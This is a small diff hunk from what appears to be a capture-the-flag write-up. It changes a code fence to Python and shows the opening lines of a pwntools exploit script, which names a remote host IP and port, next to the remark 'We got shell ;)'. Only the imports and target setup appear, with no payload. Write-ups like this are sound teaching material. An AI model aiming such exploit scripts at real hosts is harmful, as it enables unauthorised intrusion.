@@ -58,7 +58,7 @@ We got shell ;)
 
 *Nobodyisnobody for RootMeUpBeforeYouGoGo
 
-```
+```python
 from pwn import *
 
 host, port = "151.236.114.211", "17183"
